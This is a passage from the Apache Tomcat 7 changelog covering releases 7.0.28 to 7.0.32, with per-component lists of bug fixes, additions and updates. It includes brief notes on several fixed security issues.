requests. (kkolinko) | | fix | [54141](https://bz.apache.org/bugzilla/show_bug.cgi?id=54141): Increase the permitted number of nested Realm levels from 2 to 3 by default and make the limit configurable via a system property. (markt) | | fix | Revert occasional API change in `BaseDirContext` class that was done in 7.0.32. Methods should not be `final`. (kkolinko) | | fix | Prevent failures in the AccessLogValve when running under a SecurityManager and the first request received is an asynchronous one. (markt) | |  | **Coyote** | | --- | | | fix | Correct an issue that prevented WebSockets from being used over SSL when using the HTTP NIO connector. (markt) | | --- | --- | | fix | [54022](https://bz.apache.org/bugzilla/show_bug.cgi?id=54022): Ensure the Comet END event is triggered on client disconnect with APR/native on Windows Vista/2k8 or later. Patch provided by Douglas Beachy. (markt) | | fix | [54067](https://bz.apache.org/bugzilla/show_bug.cgi?id=54067): Ensure responses with 1xx response codes are correctly marked as not containing an entity body. This caused an issue for some WebSocket clients when an Transfer-Encoding header was sent with the 101 (HTTP upgrade) response. (markt) | |  | **Jasper** | | --- | | | code | [53867](https://bz.apache.org/bugzilla/show_bug.cgi?id=53867): Optimise the XML escaping provided by the PageContext implementation. Based on a patch by Sheldon Shao. (markt) | | --- | --- | | code | [53896](https://bz.apache.org/bugzilla/show_bug.cgi?id=53896): Use an optimised CompositeELResolver for Jasper that skips resolvers that are known to be unable to resolve the value. Patch by Jarek Gawor. (markt) | | fix | [53986](https://bz.apache.org/bugzilla/show_bug.cgi?id=53986): Correct a regression introduced by the fix for [53713](https://bz.apache.org/bugzilla/show_bug.cgi?id=53713). JSP comments that ended with the sequence ---%> (or any similar sequence with a odd number of - characters) was not correctly parsed. (markt) | | fix | [54011](https://bz.apache.org/bugzilla/show_bug.cgi?id=54011): Fix a bug in the tag plug-in for `<c:out>` that triggered a JSP compilation error if the `escapeXml` attribute was used. Patch provided by Sheldon Shao. (markt) | | code | Follow up to [54011](https://bz.apache.org/bugzilla/show_bug.cgi?id=54011). Simplify generated code for `<c:out>`. Based on a patch by Sheldon Shao. (markt) | | fix | [54012](https://bz.apache.org/bugzilla/show_bug.cgi?id=54012): Fix a bug in the tag plug-in infrastructure that meant the `<c:set>` triggered a JSP compilation error when used in a tag file. Based on a patch provided by Sheldon Shao. (markt) | | code | [54017](https://bz.apache.org/bugzilla/show_bug.cgi?id=54017): Simplify coercion of `String` instances to `Object`. (markt) | | fix | [54144](https://bz.apache.org/bugzilla/show_bug.cgi?id=54144): Fix a bug in the tag plug-in for `<c:out>` that meant that if the value of the tag evaluated to a `java.io.Reader` object then it was not correctly handled. (markt) | |  | **Cluster** | | --- | | | fix | Add getSessionIdsFull operation to mbeans-descriptor. listSessionIdsFull no longer exist. (kfujino) | | --- | --- | | fix | [54086](https://bz.apache.org/bugzilla/show_bug.cgi?id=54086): Fix threading issue when stopping an `NioReceiver`. (markt) | |  | **Web applications** | | --- | | | add | [54143](https://bz.apache.org/bugzilla/show_bug.cgi?id=54143): Add display of the memory pools usage (including PermGen) to the Status page of the Manager web application. (kkolinko) | | --- | --- | |  | **Tribes** | | --- | | | fix | [54045](https://bz.apache.org/bugzilla/show_bug.cgi?id=54045): Make sure getMembers() returns available member when TcpFailureDetector works in static cluster. (kfujino) | | --- | --- | | | |  | **Tomcat 7.0.32 (markt)** | **released 2012-10-09** | | --- | --- | | | **Catalina** | | --- | | | fix | Revert multiple operation support for the `JMXProxyServlet` pending further discussion. (schultz) | | --- | --- | | fix | CVE-2012-4431: Fix bypass of `CsrfPreventionFilter` when there is no session. Improve session management in the filter. (kkolinko) | |  | **Web applications** | | --- | | | fix | Correct the couple of broken links in the Tomcat Javadoc. (markt) | | --- | --- | |  | **Other** | | --- | | | update | Update optional Checkstyle library to 5.6. (kkolinko) | | --- | --- | | | |  | **Tomcat 7.0.31 (markt)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | update | Add one library from JDK 7 to the value of `jarsToSkip` property in the `catalina.properties` file. (kkolinko) | | --- | --- | | add | [52777](https://bz.apache.org/bugzilla/show_bug.cgi?id=52777): Add an option to automatically remove old, unused versions (ones where there are no longer any active sessions) of applications deployed using parallel deployment. (markt) | | fix | [53828](https://bz.apache.org/bugzilla/show_bug.cgi?id=53828): Use correct status code when closing a WebSocket connection normally in response to a close frame from a client. (markt) | | update | `JMXProxyServlet` now allows multiple operation commands like `invokeAndSet`, `invokeAndGet`, etc. (schultz) *Note*: reverted in 7.0.32. | | fix | [53843](https://bz.apache.org/bugzilla/show_bug.cgi?id=53843): `request.isAsyncStarted()` must continue to return true until the dispatch actually happens (which at the earliest isn't until the thread where `startAsync()` was called returns to the container). (markt) | | fix | [53863](https://bz.apache.org/bugzilla/show_bug.cgi?id=53863): Ensure that the implicit servlets (JSP and default) are marked as override-able when using embedded mode. (markt) | | fix | When the `DefaultServlet` is under heavy load, the HTTP header parser added to address [52811](https://bz.apache.org/bugzilla/show_bug.cgi?id=52811) generates large amounts of garbage and uses significant CPU time. A cache has been added that significantly reduces the overhead of this parser. (markt) | | fix | [53854](https://bz.apache.org/bugzilla/show_bug.cgi?id=53854): Make directory listings work correctly when aliases are used. (markt) | |  | **Jasper** | | --- | | | code | [53713](https://bz.apache.org/bugzilla/show_bug.cgi?id=53713): Performance improvement of up to four times faster parsing of JSP pages. Patch provided by Sheldon Shao. (markt) | | --- | --- | |  | **Cluster** | | --- | | | add | Make the cluster members and the cluster deployer associated with the cluster accessible via JMX. (markt) | | --- | --- | | fix | Fix a behavior of TcpPingInterceptor#useThread. If set to false, ping thread is never started. (kfujino) | |  | **Web applications** | | --- | | | add | Improve the documentation web application to clarify the difference between the tag and version parameters when using text interface of the Manager web application. (markt) | | --- | --- | | add | Make sessions saved in the `Store` associated with a `Manager` that extends `PersistentManager` optionally visible (via the showProxySessions Servlet initialisation parameter in web.xml) to the Manager web application. (markt) | | | |  | **Tomcat 7.0.30 (markt)** | **released 2012-09-06** | | --- | --- | | | **Catalina** | | --- | | | fix | Automatically delete temporary files used by Servlet 3.0 file upload (for parts which size is greater than `file-size-threshold` option in web.xml) when request processing completes. (kkolinko) | | --- | --- | | fix | [53071](https://bz.apache.org/bugzilla/show_bug.cgi?id=53071): This additional fix for this issue improves the formatting of Jasper errors (or any exceptions that use a multi-line message) with the `ErrorReportValve`. (markt) | | fix | [53469](https://bz.apache.org/bugzilla/show_bug.cgi?id=53469): If a URL passed to `javax.servlet.http.HttpServletResponse.encodeURL()` cannot be made absolute, never encode it and return it unchanged. Previously, the fix for [53062](https://bz.apache.org/bugzilla/show_bug.cgi?id=53062) meant than an `IllegalArgumentException` was thrown. (markt) | | fix | [53481](https://bz.apache.org/bugzilla/show_bug.cgi?id=53481): Added support for SSLHonorCipherOrder to allow the server to impose its cipher order on the client. Based on a patch provided by Marcel Šebek. This feature requires Tomcat Native 1.1.25 or later. (schultz) | | fix | [53498](https://bz.apache.org/bugzilla/show_bug.cgi?id=53498): Fix atomicity bugs in use of concurrent collections. Based on a patch by Yu Lin. (markt) | | fix | Correct a regression in the previous fix for [53062](https://bz.apache.org/bugzilla/show_bug.cgi?id=53062) that did not always correctly normalize redirect URLs when the redirect URL included a query string or fragment component. (markt) | | fix | Add missing getter and setter for `roleSearchAsUser` option on JNDI Realm. (markt) | | update | Add some HTTP status codes registered at IANA. (rjung) | | fix | [53531](https://bz.apache.org/bugzilla/show_bug.cgi?id=53531): Fix ExpandWar.expand to check the return value of File.mkdir and File.mkdirs. (schultz) | | fix | [53535](https://bz.apache.org/bugzilla/show_bug.cgi?id=53535): Reduce memory footprint when performing class scanning on Context start. Patch provided by Cedomir Igaly. (markt) | | fix | [53541](https://bz.apache.org/bugzilla/show_bug.cgi?id=53541): Fix JAR scanning when WEB-INF/lib is provided via VirtualDirContext. Patch provided by Philip Zuev. (markt) | | fix | [53574](https://bz.apache.org/bugzilla/show_bug.cgi?id=53574): Ensure Servlets defined using jsp-file are available when metadata-complete is true. (markt) | | fix | [53584](https://bz.apache.org/bugzilla/show_bug.cgi?id=53584): Ignore path parameters when comparing URIs for FORM authentication. This prevents users being prompted twice for passwords when logging in when session IDs are being encoded as path parameters. (markt) | | fix | [53623](https://bz.apache.org/bugzilla/show_bug.cgi?id=53623): When performing a asynchronous dispatch after series of forwards, ensure that the request properties are correct for the request at each stage. (markt) | | fix | [53624](https://bz.apache.org/bugzilla/show_bug.cgi?id=53624): Ensure that `HttpServletResponse.sendRedirect()` works when called after a dispatch from an `AsyncContext`. (markt) | | fix | [53641](https://bz.apache.org/bugzilla/show_bug.cgi?id=53641): Correct name of HTTP header used in WebSocket handshake for listing the preferred protocols. (markt) | | code | Document the constants that were added to the `RequestDispatcher` interface in Servlet 3.0. (kkolinko) | | fix | Ensure custom error pages are not truncated if the page that triggered the error set a content length header. (markt) | | fix | [53677](https://bz.apache.org/bugzilla/show_bug.cgi?id=53677): Ensure that a 500 response rather than no response is returned if the HTTP headers exceed the size limit. (markt) | | fix | [53702](https://bz.apache.org/bugzilla/show_bug.cgi?id=53702): When merging web.xml fragments, allow for `<jsp-property-group>` elements having multiple `<url-pattern>` elements. (markt) | | add | Always make the resulting web.xml available even if metadata-complete is true. (markt) | | fix | [53714](https://bz.apache.org/bugzilla/show_bug.cgi?id=53714): Provide separate system properties to control which JARs are excluded from which scans when using the JarScanner. This allows JARs to be excluded from all scans or only from TLD scanning and/or Servlet 3.0 pluggability scanning. (markt) | | update | Add several JDK libraries to the value of `jarsToSkip` property in the `catalina.properties` file. (markt, kkolinko) | | fix | Fix typos etc. in the code that logs merged web.xml (as enabled by `logEffectiveWebXml` option on Context). (kkolinko) | | fix | [53758](https://bz.apache.org/bugzilla/show_bug.cgi?id=53758): When adding filters via `FilterRegistration.Dynamic` the filters were added at the wrong point because the `isMatchAfter`  logic was inverted. (markt) | | fix | [53783](https://bz.apache.org/bugzilla/show_bug.cgi?id=53783): Correctly handle JARs generated by tools that do not create specific entries for directories. Patch provided by Violeta Georgieva. (markt) | | fix | Improvements to DIGEST authenticator including the disabling caching of authenticated user in session by default, tracking server rather than client nonces and better handling of stale nonce values. (markt) | | fix | Improve performance of DIGEST authenticator for concurrent requests. (markt) | | fix | CVE-2012-3546: Fix bypass of security constraint checks with FORM authentication. Remove unneeded processing in `RealmBase`. (kkolinko) | | fix | [53800](https://bz.apache.org/bugzilla/show_bug.cgi?id=53800): `FileDirContext.list()` did not provide correct paths for subdirectories. Patch provided by Kevin Wooten. (kkolinko) | | fix | [53801](https://bz.apache.org/bugzilla/show_bug.cgi?id=53801): Overlapping URL patterns were sometimes merged incorrectly in security constraints leading to incorrect 401 responses. Note: it was possible for access to be denied when it should have been granted but it was not possible for access to be granted when it should have been denied. (markt) | |  | **Coyote** | | --- | | | fix | Remove the `socket.soTrafficClass` from the BIO and NIO HTTP and AJP connectors because any use of the option is either ignored or in some cases (Java 7 with NIO) throws an Exception. (markt) | | --- | --- | | fix | Prevent possible NPE when processing Comet requests during Connector shutdown. (markt) | | fix | [42181](https://bz.apache.org/bugzilla/show_bug.cgi?id=42181): Better handling of edge conditions in chunk header processing. (kkolinko) | | fix | [53697](https://bz.apache.org/bugzilla/show_bug.cgi?id=53697): Correct a regression in the fix for [51881](https://bz.apache.org/bugzilla/show_bug.cgi?id=51881) that mean that in some circumstances the `comet` flag was not reset on `HttpAprProcessor` instances. This caused problems when the Processor was re-used for a new connection that would trigger a `NullPointerException` and could result in a JVM crash. (markt) | | fix | [53725](https://bz.apache.org/bugzilla/show_bug.cgi?id=53725): Fix possible corruption of GZIP'd output. (markt/kkolinko) | | fix | Better parsing of line-terminators for requests using chunked encoding. (markt) | | fix | Further improvements to handling of Comet END events when the connector is stopped. (markt) | |  | **Jasper** | | --- | | | fix | [53545](https://bz.apache.org/bugzilla/show_bug.cgi?id=53545): Ensure buffered data is cleared when using a jsp:forward action inside a classic custom tag. (markt) | | --- | --- | | fix | [53654](https://bz.apache.org/bugzilla/show_bug.cgi?id=53654): Support `file://` URLs for JSP dependencies. Patch provided by Viola Lu. (markt) | | fix | [53792](https://bz.apache.org/bugzilla/show_bug.cgi?id=53792): Support `MethodExpression`s that include a method invocation that is not at the end of the expression. (markt) | |  | **Cluster** | | --- | | | fix | Fix an issue when running under Java 7 which throws exceptions when trying to set an invalid option whereas Java 6 silently swallowed them. The option using the problem was `soTrafficClass`. Investigations showed that this option had no effect for Cluster Channel Receivers so it was removed. (markt) | | --- | --- | | fix | [53513](https://bz.apache.org/bugzilla/show_bug.cgi?id=53513): Fix race condition between the processing of session sync message and transfer complete message. (kfujino) | |  | **Web applications** | | --- | | | fix | Update JSTL version information in the JNDI section of the documentation web application. (markt) | | --- | --- | | fix | [53524](https://bz.apache.org/bugzilla/show_bug.cgi?id=53524): Correct a typo in the cluster how-to section of the documentation web application. Also fix a handful of spelling errors. (markt) | | fix | [53601](https://bz.apache.org/bugzilla/show_bug.cgi?id=53601): Clarify in documentation that building Apache Tomcat 7 from sources requires a Java 6 JDK. (kkolinko) | | fix | [53653](https://bz.apache.org/bugzilla/show_bug.cgi?id=53653): Allow for wrapped source code example in config/context.html. Patch provided by Terence Bandoian. (schultz) | | update | [53793](https://bz.apache.org/bugzilla/show_bug.cgi?id=53793): Change links on the list of applications in the Manager to point to '/appname/' instead of '/appname'. (kkolinko) | |  | **Tribes** | | --- | | | fix | Avoid potential NPE identified by Find Bugs in `org.apache.catalina.tribes.io.ReplicationStream`. (markt) | | --- | --- | | fix | [53606](https://bz.apache.org/bugzilla/show_bug.cgi?id=53606): Fix potential NPE in `TcpPingInterceptor`. Based on a patch by F. Arnoud. (markt) | | fix | [53607](https://bz.apache.org/bugzilla/show_bug.cgi?id=53607): To avoid NPE, set TCP PING data to ChannelMessage. Patch provided by F.Arnoud (kfujino) | |  | **Other** | | --- | | | fix | [53701](https://bz.apache.org/bugzilla/show_bug.cgi?id=53701): Javadoc fixes. Patch provided by sebb. (markt) | | --- | --- | | code | Remove some unused code from Tomcat's package renamed, cut-down copy of Commons BCEL used for annotation scanning. (markt) | | add | [53735](https://bz.apache.org/bugzilla/show_bug.cgi?id=53735): Add support for Java 7 byte code to Tomcat's package renamed, cut-down copy of Commons BCEL used for annotation scanning. (markt) | | | |  | **Tomcat 7.0.29 (markt)** | **released 2012-07-08** | | --- | --- | | | **Catalina** | | --- | | | add | Add support for searching for roles in JNDI/LDAP using another value than the actual DN or username specified. Rather it will use a value from the users directory entry. The new attribute introduced to the JNDIRealm is userRoleAttribute (fhanik) | | --- | --- | | fix | Fix checking of recommended tcnative library version when using the APR connector. (rjung) | | update | [50306](https://bz.apache.org/bugzilla/show_bug.cgi?id=50306): Improve StuckThreadDetectionValve: add stuckThreadNames property as a pair for the stuckThreadIds one, add thread ids to the log messages. (kkolinko) | | add | [52135](https://bz.apache.org/bugzilla/show_bug.cgi?id=52135): Add support for a default error page to be defined in web.xml by defining an error page with just a nested location element. It appears this feature was intended to be included in the Servlet 3.0 specification but was accidently left out. (markt) | | fix | [53450](https://bz.apache.org/bugzilla/show_bug.cgi?id=53450): Correct regression in fix for [52999](https://bz.apache.org/bugzilla/show_bug.cgi?id=52999) that could easily trigger a deadlock when deploying a ROOT web application. (markt) | | fix | As per section 1.6.2 of the Servlet 3.0 specification and clarification from the Servlet Expert Group, the servlet specification version declared in web.xml no longer controls if Tomcat scans for annotations. Annotation scanning is now always performed - regardless of the version declared in web.xml - unless metadata complete is set to true. (markt) | | fix | [53619](https://bz.apache.org/bugzilla/show_bug.cgi?id=53619): As per clarification from the Servlet Expert Group, JARs will always be scanned for ServletContainerInitializers regardless of the setting of metadata complete. However, if an absolute ordering is specified and a JAR is excluded from that ordering it will not be scanned for ServletContainerInitializers nor will it be scanned for matches to any HandleTypes annotations. (markt) | | add | [53465](https://bz.apache.org/bugzilla/show_bug.cgi?id=53465): Populate mapped-name property for resources defined in web.xml. Based on a patch by Violeta Georgieva. (markt) | | add | Make the request available when establishing a WebSocket connection. (markt) | | fix | [53467](https://bz.apache.org/bugzilla/show_bug.cgi?id=53467): Correct a regression in the fix for [53257](https://bz.apache.org/bugzilla/show_bug.cgi?id=53257) that introduced problems for JSPs that used characters that must be encoded if used in a URI. (markt) | |  | **Coyote** | | --- | | | fix | [53430](https://bz.apache.org/bugzilla/show_bug.cgi?id=53430): Avoid a JVM crash when a connector that requires the APR/native library is explicitly specified and the library, or a recent enough version of it, is not available. (markt) | | --- | --- | |  | **Jasper** | | --- | | | fix | [53421](https://bz.apache.org/bugzilla/show_bug.cgi?id=53421): Provide a more helpful error message if a getter or setter cannot be found for a bean property when using expression language. (markt) | | --- | --- | | fix | [53460](https://bz.apache.org/bugzilla/show_bug.cgi?id=53460): Allow container to handle errors if the creation of the PageContext fails rather than swallowing the error. (markt) | |  | **Web applications** | | --- | | | fix | Update the WebSocket examples in the examples web application so that they work with secure connections (wss) as well as non-secure (ws) connections. (markt) | | --- | --- | | fix | [53456](https://bz.apache.org/bugzilla/show_bug.cgi?id=53456): Minor corrections and improvements to the HTTP connector configuration reference. Patch provided by sebb. (markt) | | fix | [53459](https://bz.apache.org/bugzilla/show_bug.cgi?id=53459): Correction and clarifications to the SSL Connector configuration examples in the SSL how-to. (markt) | | fix | [53464](https://bz.apache.org/bugzilla/show_bug.cgi?id=53464): Correct reference to sample init.d script for use with jsvc in the documentation web application. (markt) | | fix | [53473](https://bz.apache.org/bugzilla/show_bug.cgi?id=53473): Correct the allowed values for the SSI option `isVirtualWebappRelative` which are `true` or `false`. (markt) | | fix | Document `roleNested` property of `JNDIRealm` in Configuration Reference. (kkolinko) | |  | **jdbc-pool** | | --- | | | fix | [53445](https://bz.apache.org/bugzilla/show_bug.cgi?id=53445) ([r1354173](https://svn.apache.org/viewvc?view=rev&rev=1354173)): Allow configurable name for SlowQueryReportJmx (fhanik) | | --- | --- | | fix | [53416](https://bz.apache.org/bugzilla/show_bug.cgi?id=53416) ([r1354641](https://svn.apache.org/viewvc?view=rev&rev=1354641)): Multiple pools with the same name should register under JMX (fhanik) | |  | **Other** | | --- | | | fix | Fix cleanup of temporary files in `TestNamingContext` test. (kkolinko) | | --- | --- | | fix | Remove a few files from the source distribution that are not required since they are copied / generated during the build. (markt) | | fix | Add manifest files to the set of files for which the line-ending is changed to match the OS defaults in the source distributions. (markt) | | code | Align Jk Ant tasks definitions between antlib.xml and catalina.tasks files, introducing `jkupdate` as synonym for `jkstatus`. The latter one is deprecated. Simplify `bin/catalina-tasks.xml`, replacing `taskdef` with `typedef` and adding Ant condition implementations used with JMX to `jmxaccessor.tasks` file. (kkolinko) | | fix | [53454](https://bz.apache.org/bugzilla/show_bug.cgi?id=53454): Return correct content-length header for HEAD requests when content length is greater than 2GB. (markt) | | | |  | **Tomcat 7.0.28 (markt)** | **released 2012-06-19** | | --- | --- | | | **Catalina** | | --- | | | fix | [52055](https://bz.apache.org/bugzilla/show_bug.cgi?id=52055): An additional fix to ensure that the ChunkedInputFilter is correctly recycled. (markt) | | --- | --- | | add | [52954](https://bz.apache.org/bugzilla/show_bug.cgi?id=52954): Make DIGEST authentication tolerant of clients (mainly older Android implementations) that do not follow RFC 2617 exactly. (markt) | | update | [52955](https://bz.apache.org/bugzilla/show_bug.cgi?id=52955): Implement custom thread factory for container start-stop thread pool. It allows to use daemon threads and give them more distinct names. (kfujino) | | fix | [52999](https://bz.apache.org/bugzilla/show_bug.cgi?id=52999): Remove synchronization bottleneck from the firing of `Container` events. (markt) | | add | [53008](https://bz.apache.org/bugzilla/show_bug.cgi?id=53008): Additional test cases for BASIC authentication and RFC2617 compliance. Patch provided by Brian Burch. (markt) | | fix | [53021](https://bz.apache.org/bugzilla/show_bug.cgi?id=53021): Correct WebSocket protocol version detection. (pero) | | add | Add new attributes of `allow` and `deny` to UserConfig. (kfujino) | | fix | [53024](https://bz.apache.org/bugzilla/show_bug.cgi?id=53024): Fix context reloading so requests received during the reload are paused and processed when reloading completes rather than receiving 404 responses. (markt) | | add | Improve the handling of watched resources so that changes trigger a reload rather than a stop followed by a start which allows requests received to be paused and processed when reloading completes rather than receiving 404 responses. (markt) | | fix | Remove potential bottleneck on creation of new WebSocket connections. (markt) | | fix | [53047](https://bz.apache.org/bugzilla/show_bug.cgi?id=53047): If a JDBC Realm or DataSource Realm is configured for an all roles mode that only requires authorization (and no roles) and no role table or column is defined, don't populate the Principal's roles. (markt) | | fix | [53056](https://bz.apache.org/bugzilla/show_bug.cgi?id=53056): Add APR version number to tcnative version INFO log message. (schultz) | | fix | [53057](https://bz.apache.org/bugzilla/show_bug.cgi?id=53057): Add OpenSSL version number INFO log message when initializing. (schultz) | | update | Save a bit of memory in annotations cache in `DefaultInstanceManager` by trimming annotation lists to their size. (kkolinko) | | fix | Correctly configure the parser used to process server.xml so that external entities may be used to include the content of external files into server.xml. (markt) | | fix | Make sure ContextMBean#findFilterDefs returns correct filter definitions. (kfujino) | | add | Ensure that `maxParameterCount` applies to multi-part requests handled via the Servlet 3 file upload API. (markt) | | fix | [53062](https://bz.apache.org/bugzilla/show_bug.cgi?id=53062): When constructing absolute URLs for redirects from relative URLs ensure that the resulting URLs are normalized. (markt) | | fix | [53067](https://bz.apache.org/bugzilla/show_bug.cgi?id=53067): Ensure the WebSocket Servlet continues to work when requests are wrapped. (markt) | | fix | Enable host's xmlBase attribute in ContextConfig. (kfujino) | | fix | [53071](https://bz.apache.org/bugzilla/show_bug.cgi?id=53071): Use the message from the throwable (if there is one) when generating the report in the `ErrorReportValve` and no message has been specified via `sendError()`. (markt) | | fix | [53074](https://bz.apache.org/bugzilla/show_bug.cgi?id=53074): Switch to an infinite socket timeout by default for WebSocket connections. (markt) | | fix | [53081](https://bz.apache.org/bugzilla/show_bug.cgi?id=53081): Do not always cache resources loaded by the web application class loader since they may be very large which in turn could trigger a memory leak. Calls to the web application class loader's `getResourceAsStream()` method will now access the resource directly rather than via the cache in most cases. (markt) | | fix | [53090](https://bz.apache.org/bugzilla/show_bug.cgi?id=53090): Include superclasses when considering injection targets. Patch provided by Borislav Kapukaranov. (markt) | | fix | [53161](https://bz.apache.org/bugzilla/show_bug.cgi?id=53161): Provide a better error message if a `ClassFormatException` occurs during annotation scanning and do not prevent the web application from starting in this case. (markt) | | fix | [53180](https://bz.apache.org/bugzilla/show_bug.cgi?id=53180): Improve check for setter method when processing annotations. Patch provided by Violeta Georgieva. (markt) | | fix | [53225](https://bz.apache.org/bugzilla/show_bug.cgi?id=53225): Fix an IllegalStateException due to the JAR file being closed when accessing static resources in a JAR file when `urlCacheProtection="false"` in the `JreMemoryLeakPreventionListener`. (markt) | | fix | [53230](https://bz.apache.org/bugzilla/show_bug.cgi?id=53230): Changed ManagerBase to throw TooManyActiveSessionsException instead of IllegalStateException when the maximum number of sessions has been exceeded and a new session will not be created. (schultz) | | fix | [53257](https://bz.apache.org/bugzilla/show_bug.cgi?id=53257): Ensure that resources, including JSP files, that have names that include characters with special meanings in URLs (such as ampersand, semicolon, plus, hash and percent) are correctly handled. This bug is partially a regression caused by the original fix for [51584](https://bz.apache.org/bugzilla/show_bug.cgi?id=51584) and partially an existing issue that had not previously been identified. This fix reverts the original fix for [51584](https://bz.apache.org/bugzilla/show_bug.cgi?id=51584), correctly fixes that issue and fixes the additional issues identified by the test cases that were also added as part of this fix. (markt/kkolinko) | | fix | [53266](https://bz.apache.org/bugzilla/show_bug.cgi?id=53266): If a class specified in a `@HandlesTypes` annotation on a `ServletContainerInitializer` is missing log a more helpful message and do not prevent the web application from starting. (markt) | | fix | [53267](https://bz.apache.org/bugzilla/show_bug.cgi?id=53267): Ensure that using the GC Daemon Protection feature of the `JreMemoryLeakPreventionListener` does not trigger a full GC every hour. (markt) | | fix | [53285](https://bz.apache.org/bugzilla/show_bug.cgi?id=53285): Do not require `security-role-ref` elements to contain a `role-link` element. (markt) | | fix | [53301](https://bz.apache.org/bugzilla/show_bug.cgi?id=53301): Prevent double initialization of pre-created Servlet instances when used in embedded mode. (markt) | | fix | [53322](https://bz.apache.org/bugzilla/show_bug.cgi?id=53322): When processing resource injection, correctly infer property name from its setter method if the name starts with several uppercase characters. (kkolinko) | | fix | [53333](https://bz.apache.org/bugzilla/show_bug.cgi?id=53333): When processing JNDI resources, take account of the types of any specified injection targets to ensure that the resource definition and the injection target types are consistent. Based on a patch provided by Violeta Georgieva. (markt) | | fix | [53337](https://bz.apache.org/bugzilla/show_bug.cgi?id=53337): Forwarding via a `RequestDispatcher` to an asynchronous Servlet always failed. Includes a test case based on code by Rossen Stoyanchev. (markt) | | fix | [53339](https://bz.apache.org/bugzilla/show_bug.cgi?id=53339): Ensure WebSocket call backs (`onOpen` etc.) are called using the web application's class loader. (markt) | | fix | [53342](https://bz.apache.org/bugzilla/show_bug.cgi?id=53342): To avoid BindException, make startStopThreads into a demon thread. (kfujino) | | fix | [53353](https://bz.apache.org/bugzilla/show_bug.cgi?id=53353): Make the internal HTTP header parser more tolerant of Content-Type values that contain invalid parameters by ignoring the invalid parameters. It is a followup to bug [52811](https://bz.apache.org/bugzilla/show_bug.cgi?id=52811). (markt) | | fix | [53354](https://bz.apache.org/bugzilla/show_bug.cgi?id=53354): Correctly handle `@WebFilter` annotations that do not include a mapping. (markt) | | fix | [53356](https://bz.apache.org/bugzilla/show_bug.cgi?id=53356): Add support for servlets mapped explicitly to the context root of a web application. (markt) | | fix | [53366](https://bz.apache.org/bugzilla/show_bug.cgi?id=53366): Ensure new HTTP header parser works correctly when running Tomcat under a security manager. (markt/kkolinko) | | fix | [53368](https://bz.apache.org/bugzilla/show_bug.cgi?id=53368): Configure the default security policy to allow web applications to use WebSocket when running under a security manager. (markt/kkolinko) | | fix | [53373](https://bz.apache.org/bugzilla/show_bug.cgi?id=53373): Allow whitespace around delimiters in <Context> aliases for readability. (schultz) | |  | **Coyote** | | --- | | | fix | [52858](https://bz.apache.org/bugzilla/show_bug.cgi?id=52858), CVE-2012-4534: Correct fix for high CPU load. (fhanik) | | --- | --- | | fix | [53138](https://bz.apache.org/bugzilla/show_bug.cgi?id=53138): Broken Sendfile on SSL introduced in 7.0.27 (fhanik) | | fix | [52055](https://bz.apache.org/bugzilla/show_bug.cgi?id=52055): Additional fix required to ensure that `InputFilter`s are recycled between requests. (markt) | | fix | [53061](https://bz.apache.org/bugzilla/show_bug.cgi?id=53061): Fix a problem in the NIO connector whereby if the poller was under low but consistent load (>1 request/per second and always less than 1 second between requests) timeouts never took place. (markt) | | fix | [53063](https://bz.apache.org/bugzilla/show_bug.cgi?id=53063): When using an Executor with BIO, use the executor's maxThreads as the default for maxConnections. (markt) | | fix | [53119](https://bz.apache.org/bugzilla/show_bug.cgi?id=53119): Prevent buffer overflow errors being reported when a client disconnects before the response has been fully written from an AJP connection using the APR/native connector. (markt) | | add | [53169](https://bz.apache.org/bugzilla/show_bug.cgi?id=53169): Allow developers to avoid chunked encoding for a response of unknown length by setting the `Connection: close` header. Based on a patch suggested by Philippe Marschall. (markt) | | fix | [53173](https://bz.apache.org/bugzilla/show_bug.cgi?id=53173): Properly count down maxConnections (fhanik) | | update | Update default value of pollerThreadCount for the NIO connector. The new default value will never go above 2 regardless of available processors. (fhanik) | | add | Allow to retrieve the current `connectionCount` via getter from the endpoint and as JMX attribute of the ThreadPool mbean. (rjung) | | fix | Correct an edge case where Comet END events were not send to connected clients when the Tomcat connector was stopped. (markt) | | fix | [53406](https://bz.apache.org/bugzilla/show_bug.cgi?id=53406): Fix possible stack overflow on connection close when using Comet. (fhanik) | | fix | Improve `InternalNioInputBuffer.parseHeaders()`. (kkolinko) | | add | Implement `maxHeaderCount` attribute on Connector. It is equivalent of LimitRequestFields directive of [Apache HTTPD](http://httpd.apache.org/). Default value is 100. (kkolinko) | |  | **Jasper** | | --- | | | fix | [48097#c7](https://bz.apache.org/bugzilla/show_bug.cgi?id=48097#c7), [53366#c1](https://bz.apache.org/bugzilla/show_bug.cgi?id=53366#c1): If JSP page unexpectedly fails to initialize PageContext instance, write exception to the logs instead of silent swallowing. (kkolinko) | | --- | --- | | fix | [53032](https://bz.apache.org/bugzilla/show_bug.cgi?id=53032): Modify `JspC` so it extends `org.apache.tools.ant.Task` enabling it to work with features such as namespaces within build.xml files. (markt) | |  | **Cluster** | | --- | | | fix | Avoid NPE when reload if a state of a BackupManager is FAILED. (kfujino) | | --- | --- | | fix | [53087](https://bz.apache.org/bugzilla/show_bug.cgi?id=53087): In order to avoid that a backup node expire a session, replicate session access time in BackupManager. (kfujino) | | add | Add support for SecureRandom to cluster manager template. (kfujino) | |  | **Web applications** | | --- | | | fix | Remove obsolete bug warning from Windows service documentation page. (rjung) | | --- | --- | | add | [50182](https://bz.apache.org/bugzilla/show_bug.cgi?id=50182): Various improvements to the Compression Filter. Patch provided by David Becker. (markt) | | fix | [52853](https://bz.apache.org/bugzilla/show_bug.cgi?id=52853): Clarify how Jar Scanner handles directories. (markt) | | fix | [53158](https://bz.apache.org/bugzilla/show_bug.cgi?id=53158): Fix documented defaults for DBCP 1.x. Patch provided by ph.dezanneau at gmail.com. (rjung) | | fix | [53203](https://bz.apache.org/bugzilla/show_bug.cgi?id=53203): Correct documentation for the default value of `connectionTimeout` attribute for AJP protocol connectors. (kkolinko) | | update | [53289](https://bz.apache.org/bugzilla/show_bug.cgi?id=53289): Clarify `ResourceLink` example that uses DataSource.getConnection(username, password) method. Not all data source implementations support it. (kkolinko) | | fix | Fix several HTML markup errors in servlets of examples web application. (kkolinko) | | fix | [53398](https://bz.apache.org/bugzilla/show_bug.cgi?id=53398): Correct spelling of "received" in the Manager application's XML output. (markt) | | fix | [53403](https://bz.apache.org/bugzilla/show_bug.cgi?id=53403): Update a reference to the Servlet specification in the first web application section of the documentation web application to include newer versions of the specification. (markt) | |  | **jdbc-pool** | | --- | | | fix | [50864](https://bz.apache.org/bugzilla/show_bug.cgi?id=50864) 